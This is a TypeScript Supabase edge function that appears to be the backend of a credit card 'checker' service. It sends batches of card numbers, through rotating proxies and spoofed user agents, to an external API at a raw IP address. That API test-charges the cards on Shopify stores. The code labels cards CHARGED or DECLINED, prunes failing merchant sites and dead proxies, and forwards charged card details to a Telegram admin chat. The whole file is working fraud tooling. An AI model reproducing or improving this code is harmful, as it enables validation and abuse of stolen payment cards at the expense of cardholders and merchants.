import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID") || "8496943061";

const API_BASE_URL = "http://108.165.12.183:8081/";

const badResponses = [
  "Site not supported",
  "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
  "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
  "Payment method not available",
  "ARTIFACT_DISSATISFACTION",
  "VALIDATION_CUSTOM",
];

// Responses that need 3 consecutive hits before removing a site
const strikeResponses = ["MERCHANDISE_EXPECTED_PRICE_MISMATCH"];
const siteStrikeCounter: Record<string, number> = {};
const STRIKE_THRESHOLD = 3;

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
];

const getRandomItem = <T>(arr: T[]): T => arr[Math.floor(Math.random() * arr.length)];

const extractPrice = (response: string): { price: number; priceStr: string } => {
  const pricePatterns = [
    /\$[\d,]+\.?\d*/g,
    /USD\s*[\d,]+\.?\d*/gi,
    /"price":\s*"?[\d.]+/gi,
    /"amount":\s*"?[\d.]+/gi,
    /"total":\s*"?[\d.]+/gi,
  ];
  let lowestPrice = Infinity;
  let priceStr = "$0.00";
  for (const pattern of pricePatterns) {
    const matches = response.match(pattern);
    if (matches) {
      for (const match of matches) {
        const numericMatch = match.replace(/[^0-9.]/g, "");
        const value = parseFloat(numericMatch);
        if (!isNaN(value) && value > 0 && value < lowestPrice) {
          lowestPrice = value;
          priceStr = `$${value.toFixed(2)}`;
        }
      }
    }
  }
  return {
    price: lowestPrice === Infinity ? 0 : lowestPrice,
    priceStr: lowestPrice === Infinity ? "$0.00" : priceStr,
  };
};

// Notify charged card (fire-and-forget)
const notifyChargedCard = (
  userId: string,
  cardDetails: string,
  status: "CHARGED" | "DECLINED" | "UNKNOWN",
  responseMessage: string,
  amount: string,
  gateway: string
) => {
  if (!SUPABASE_SERVICE_ROLE_KEY) return;
  fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Authorization": `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
    },
    body: JSON.stringify({
      user_id: userId,
      card_details: cardDetails,
      status,
      response_message: responseMessage,
      amount,
      gateway,
    }),
  }).catch((err) => console.error("[SHOPIFY-BATCH] notify error:", err));
};

const sendAdminDebug = (cc: string, status: string, message: string, rawResponse: string, username?: string, site?: string) => {
  if (!TELEGRAM_BOT_TOKEN) return;
  const maskedCard = cc.replace(/^(\d{6})(\d+)(\d{4})/, '$1******$3');
  const truncatedRaw = rawResponse.length > 1500 ? rawResponse.substring(0, 1500) + '...' : rawResponse;
  const debugMessage = `🔧 <b>SHOPIFY BATCH DEBUG</b>\n\n📇 <b>Card:</b> <code>${maskedCard}</code>\n👤 <b>User:</b> ${username || 'Unknown'}\n🌐 <b>Site:</b> <code>${site || 'N/A'}</code>\n📊 <b>Status:</b> ${status.toUpperCase()}\n💬 <b>Message:</b> ${message}\n\n<pre>${truncatedRaw}</pre>`;
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: ADMIN_TELEGRAM_CHAT_ID, text: debugMessage, parse_mode: "HTML" }),
  }).catch(() => {});
};

interface CardResult {
  cc: string;
  computedStatus: string;
  apiStatus: string;
  apiMessage: string;
  apiTotal: string;
  rawResponse: string;
  usedSite: string;
  allProxiesDead?: boolean;
}

// Check a single card against the Shopify API with proxy rotation
const checkSingleCard = async (
  cc: string,
  sites: { url: string; price: number | null }[],
  proxies: { id: string; ip: string; port: string; username: string | null; password: string | null }[],
  adminClient: ReturnType<typeof createClient>,
  userId: string,
  username: string | null,
): Promise<CardResult> => {
  const randomSite = getRandomItem(sites);
  const formatProxy = (p: typeof proxies[0]) =>
    p.username && p.password ? `${p.ip}:${p.port}:${p.username}:${p.password}` : `${p.ip}:${p.port}`;

  const shuffledProxies = [...proxies].sort(() => Math.random() - 0.5);
  let result: { status: string; message: string; apiResponse: string; rawResponse: string; price: number; priceStr: string } | null = null;
  const failedProxyIds: string[] = [];

  for (let attempt = 0; attempt < shuffledProxies.length; attempt++) {
    const currentProxy = shuffledProxies[attempt];
    const proxyStr = formatProxy(currentProxy);
    const apiUrl = `${API_BASE_URL}?site=${encodeURIComponent(randomSite.url)}&cc=${encodeURIComponent(cc)}&proxy=${proxyStr}`;

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 60000);

    try {
      const response = await fetch(apiUrl, {
        method: 'GET',
        headers: {
          'Accept': 'application/json, text/plain, */*',
          'User-Agent': getRandomItem(userAgents),
          'Cache-Control': 'no-cache',
        },
        signal: controller.signal,
      });
      clearTimeout(timeoutId);
      const rawText = await response.text();

      if (!rawText || rawText.trim() === '') {
        result = { status: 'unknown', message: 'Empty response', apiResponse: '', rawResponse: '', price: 0, priceStr: '$0.00' };
        break;
      }

      // Check for DELIVERY_ADDRESS — classify as DECLINED
      if (rawText.includes('DELIVERY_ADDRESS')) {
        result = { status: 'dead', message: 'DELIVERY_ADDRESS error - Declined', apiResponse: 'DELIVERY_ADDRESS', rawResponse: rawText, price: 0, priceStr: '$0.00' };
        break;
      }

      // Check for strike responses (e.g. MERCHANDISE_EXPECTED_PRICE_MISMATCH) — track per site
      const matchedStrike = strikeResponses.find(s => rawText.toLowerCase().includes(s.toLowerCase()));
      if (matchedStrike) {
        const key = randomSite.url;
        siteStrikeCounter[key] = (siteStrikeCounter[key] || 0) + 1;
        console.log(`[SHOPIFY-BATCH] Strike ${siteStrikeCounter[key]}/${STRIKE_THRESHOLD} for site: ${key}`);
        if (siteStrikeCounter[key] >= STRIKE_THRESHOLD) {
          adminClient.from('gateway_urls').delete().eq('url', key).then(() => {});
          delete siteStrikeCounter[key];
        }
        result = { status: 'dead', message: `${matchedStrike} - site issue`, apiResponse: matchedStrike, rawResponse: rawText, price: 0, priceStr: '$0.00' };
        break;
      }

      const isBadResponse = badResponses.some(bad => rawText.toLowerCase().includes(bad.toLowerCase()));
      if (isBadResponse) {
        result = { status: 'dead', message: 'Bad response - site issue', apiResponse: '', rawResponse: rawText, price: 0, priceStr: '$0.00' };
        // Remove bad site
        adminClient.from('gateway_urls').delete().eq('url', randomSite.url).then(() => {});
        break;
      }

      let { price, priceStr } = extractPrice(rawText);
      let apiStatus = 'unknown';
      let apiMessage = rawText;
      let apiResponse = '';

      // Helper: check if a response is essentially empty/meaningless (should be UNKNOWN, not DEAD)
      const isEmptyOrErrorOnly = (text: string): boolean => {
        const trimmed = text.trim().toLowerCase();
        return !trimmed || trimmed === 'error:' || trimmed === 'error' || trimmed === 'error: ' || trimmed.length < 3;
      };

      try {
        const json = JSON.parse(rawText);
        if (json.Price !== undefined && json.Price > 0) { price = json.Price; priceStr = `$${Number(json.Price).toFixed(2)}`; }
        if (json.Response) { apiResponse = String(json.Response).replace(/<[^>]*>/g, ''); }
        apiMessage = json.message || json.msg || json.error || rawText;

        // If the API returned an empty/meaningless response, treat as unknown
        const responseText = (apiResponse || apiMessage || '').trim();
        if (isEmptyOrErrorOnly(responseText) && price === 0) {
          apiStatus = 'unknown';
        } else if (json.status === 'CHARGED' || json.status === 'success' || json.full_response === true) {
          apiStatus = 'live'; apiMessage = json.message || 'Charged';
        } else if (json.status === 'DECLINED' || json.status === 'failed' || json.full_response === false || json.status === 'DS_REQUIRED' || json.status === '3DS_REQUIRED') {
          apiStatus = 'dead'; apiMessage = json.message || json.error || 'Declined';
        } else if (json.status === 'error') {
          // Only mark as dead if there's a meaningful error message (not just "error:")
          const errMsg = (json.message || json.error || '').trim().toLowerCase();
          if (errMsg && errMsg !== 'error:' && errMsg !== 'error' && errMsg.length > 5) {
            apiStatus = 'dead'; apiMessage = json.message || json.error || 'Declined';
          } else {
            apiStatus = 'unknown'; apiMessage = 'Request failed';
          }
        } else {
          const lower = String(apiMessage).toLowerCase();
          const responseLower = (apiResponse || '').toLowerCase();
          const combinedText = lower + ' ' + responseLower;
          if (combinedText.includes('order_placed') || combinedText.includes('order placed') || combinedText.includes('thank you') || combinedText.includes('charged') || combinedText.includes('success') || combinedText.includes('approved')) {
            apiStatus = 'live';
          } else if (combinedText.includes('declined') || combinedText.includes('invalid') || combinedText.includes('expired') || combinedText.includes('insufficient') || combinedText.includes('card_declined') || combinedText.includes('incorrect') || combinedText.includes('do_not_honor') || combinedText.includes('fraud') || combinedText.includes('not accepted') || combinedText.includes('ds_required') || combinedText.includes('3ds') || combinedText.includes('3d_secure') || combinedText.includes('rejected') || combinedText.includes('pickup_card') || combinedText.includes('lost_card') || combinedText.includes('stolen_card') || combinedText.includes('restricted') || combinedText.includes('not_permitted') || combinedText.includes('generic_decline')) {
            apiStatus = 'dead';
          } else if (combinedText.includes('failed') || combinedText.includes('error')) {
            // Only dead if there's a substantive message, not just "error:" or "failed"
            const substantive = combinedText.replace(/error:?\s*/g, '').replace(/failed:?\s*/g, '').trim();
            if (substantive.length > 3) {
              apiStatus = 'dead';
            }
            // else stays unknown
          }
        }
      } catch {
        // JSON parse failed — could be HTML, empty, or malformed
        const lower = rawText.toLowerCase();
        if (isEmptyOrErrorOnly(lower)) {
          apiStatus = 'unknown';
        } else if (lower.includes('order_placed') || lower.includes('charged') || lower.includes('success') || lower.includes('approved')) {
          apiStatus = 'live';
        } else if (lower.includes('declined') || lower.includes('invalid') || lower.includes('expired') || lower.includes('insufficient') || lower.includes('ds_required') || lower.includes('3ds') || lower.includes('rejected')) {
          apiStatus = 'dead';
        } else if (lower.includes('failed') || lower.includes('error')) {
          const substantive = lower.replace(/error:?\s*/g, '').replace(/failed:?\s*/g, '').trim();
          if (substantive.length > 3) {
            apiStatus = 'dead';
          }
        }
      }

      // Check for proxy errors (only if not a valid API response)
      let isValidApiResponse = false;
      try {
        const parsed = JSON.parse(rawText);
        if (parsed && (parsed.Gateway || parsed.Response || parsed.Price !== undefined || parsed.status || parsed.message)) {
          isValidApiResponse = true;
        }
      } catch { /* not JSON */ }

      const rawLower = rawText.toLowerCase();
      const isProxyError = !isValidApiResponse && (
        rawLower.includes('407') || rawLower.includes('proxy error') ||
        rawLower.includes('proxy authentication') || rawLower.includes('connection refused') ||
        rawLower.includes('proxy connect') || rawLower.includes('tunneling socket')
      );

      if (isProxyError) {
        failedProxyIds.push(currentProxy.id);
        if (attempt + 1 >= shuffledProxies.length) {
          result = { status: 'unknown', message: 'All proxies failed (407)', apiResponse: '', rawResponse: rawText, price: 0, priceStr: '$0.00' };
        }
        continue;
      }

      result = { status: apiStatus, message: apiMessage, apiResponse: apiResponse || apiMessage, rawResponse: rawText, price, priceStr };
      break;
    } catch (error) {
      clearTimeout(timeoutId);
      const errMsg = error instanceof Error ? error.message : 'Error';
      if (attempt + 1 >= shuffledProxies.length) {
        result = { status: 'unknown', message: 'Timeout', apiResponse: '', rawResponse: errMsg, price: 0, priceStr: '$0.00' };
      }
    }
  }

  // Clean up failed proxies in background
  if (failedProxyIds.length > 0) {
    for (const proxyId of failedProxyIds) {
      adminClient.from('user_proxies').delete().eq('id', proxyId).then(() => {});
    }
  }

  if (!result) {
    result = { status: 'unknown', message: 'All proxies failed', apiResponse: '', rawResponse: '', price: 0, priceStr: '$0.00' };
  }

  const allProxiesDead = failedProxyIds.length >= proxies.length;

  // Auto-remove bad/empty sites (but not strike responses — those are handled above)
  const rawLower = (result.rawResponse || '').toLowerCase();
  const isBadSite = badResponses.some(bad => rawLower.includes(bad.toLowerCase()));
  const isStrikeResponse = strikeResponses.some(s => rawLower.includes(s.toLowerCase()));
  if (!isStrikeResponse && (isBadSite || (result.status === 'unknown' && (!result.rawResponse || rawLower === '' || rawLower.includes('empty response') || rawLower.includes('timeout'))))) {
    adminClient.from('gateway_urls').delete().eq('url', randomSite.url).then(() => {});
  } else if (!isStrikeResponse) {
    // Normal response — reset strike counter for this site
    if (siteStrikeCounter[randomSite.url]) {
      delete siteStrikeCounter[randomSite.url];
    }
  }

  // Update site price if valid
  if (result.price > 0 && !isBadSite) {
    if (result.price > 100) {
      adminClient.from('gateway_urls').delete().eq('url', randomSite.url).then(() => {});
    } else if (result.price !== Number(randomSite.price)) {
      adminClient.from('gateway_urls').update({ price: result.price }).eq('url', randomSite.url).then(() => {});
    }
  }

  // Map status
  let computedStatus: string;
  let displayStatus: string;
  if (result.status === 'live') { computedStatus = 'live'; displayStatus = 'CHARGED'; }
  else if (result.status === 'dead') { computedStatus = 'dead'; displayStatus = 'DECLINED'; }
  else { computedStatus = 'unknown'; displayStatus = 'UNKNOWN'; }

  const chargeAmount = result.price > 0 ? result.priceStr : (randomSite.price ? `$${Number(randomSite.price).toFixed(2)}` : 'Auto');

  // Admin debug for non-dead results
  const isSuspiciousError = result.status === 'dead' &&
    (result.apiResponse || result.message || '').trim().toLowerCase() === 'error:' &&
    result.price === 0;
  if (result.status !== 'dead' || isSuspiciousError) {
    sendAdminDebug(cc, isSuspiciousError ? 'suspicious' : result.status, result.apiResponse || result.message, result.rawResponse, username || undefined, randomSite.url);
  }

  // Broadcast CHARGED cards
  if (result.status === 'live') {
    notifyChargedCard(userId, cc, 'CHARGED', result.message, chargeAmount, 'Shopify Charge');
  }

  return {
    cc,
    computedStatus,
    apiStatus: displayStatus,
    apiMessage: result.apiResponse || result.message,
    apiTotal: chargeAmount,
    rawResponse: result.rawResponse,
    usedSite: randomSite.url,
    allProxiesDead,
  };
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(JSON.stringify({ error: "Unauthorized" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const body = await req.json();
    const { cards, priceGroup } = body;

    if (!cards || !Array.isArray(cards) || cards.length === 0) {
      return new Response(JSON.stringify({ error: 'Cards array required', results: [] }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Limit batch size to 10
    const batch = cards.slice(0, 10);

    // Auth - done ONCE for the entire batch
    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    const { data: { user }, error: authError } = await supabase.auth.getUser();
    if (authError || !user) {
      return new Response(JSON.stringify({ error: "Invalid token" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const { data: profile } = await supabase
      .from("profiles")
      .select("is_banned, username")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(JSON.stringify({ error: "Account suspended" }),
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    // Fetch sites and proxies ONCE for the entire batch
    const adminClient = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);

    let sitesQuery = adminClient
      .from('gateway_urls')
      .select('url, price')
      .not('url', 'like', 'https://razorpay.me/%')
      .lte('price', 100);

    if (priceGroup && typeof priceGroup.min === 'number' && typeof priceGroup.max === 'number') {
      sitesQuery = sitesQuery.gte('price', priceGroup.min);
      if (priceGroup.max < 100) {
        sitesQuery = sitesQuery.lt('price', priceGroup.max);
      }
    }

    const { data: sites, error: sitesError } = await sitesQuery.order('created_at', { ascending: false });

    if (sitesError || !sites || sites.length === 0) {
      return new Response(JSON.stringify({ error: 'No Shopify sites available', results: [] }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    const { data: userProxies, error: proxyError } = await adminClient
      .from('user_proxies')
      .select('*')
      .eq('user_id', user.id);

    if (proxyError || !userProxies || userProxies.length < 1) {
      return new Response(JSON.stringify({ error: 'You must add at least 1 proxy', results: [] }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
    }

    // Process ALL cards in parallel (up to 10 concurrent)
    const results = await Promise.all(
      batch.map(cc => checkSingleCard(cc, sites, userProxies, adminClient, user.id, profile?.username || null))
    );

    return new Response(
      JSON.stringify({ results }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    const msg = error instanceof Error ? error.message : 'Error';
    return new Response(JSON.stringify({ error: msg, results: [] }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } });
  }
});
